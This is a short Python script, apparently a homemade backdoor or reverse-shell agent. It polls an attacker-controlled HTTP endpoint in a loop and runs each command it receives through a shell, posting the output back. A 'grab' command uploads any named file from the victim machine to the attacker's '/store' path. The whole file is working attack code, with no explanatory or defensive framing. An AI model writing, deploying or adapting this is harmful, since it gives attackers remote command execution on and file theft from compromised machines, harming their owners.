# python2 

from six.moves import urllib
import subprocess
import time
import os

ATTACKER_ENDPOINT = 'http://attacker_server:80'
# Data is a dict
def send_post(data, url=ATTACKER_ENDPOINT):
    data = "rfile="+data
    #data = urllib.parse.quote_plus(data)
    req = urllib.request.Request(url, data=data)
    urllib.request.urlopen(req) # send request


def send_file(command):
    try:
        grab, path = command.strip().split(' ')
    except ValueError:
        send_post("[-] Invalid grab command (maybe multiple spaces)")
        return

    if not os.path.exists(path):
        send_post("[-] Not able to find the file")
        return

    store_url = ATTACKER_ENDPOINT+'/store' # Posts to /store
    with open(path, 'rb') as fp:
        send_post(fp.read(), url=store_url)


def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read())
    send_post(CMD.stderr.read())


while True:
    command = urllib.request.urlopen(ATTACKER_ENDPOINT).read().decode()

    if 'terminate' in command:
        break

    # Send file
    if 'grab' in command:
        send_file(command)
        continue

    run_command(command)
    time.sleep(1)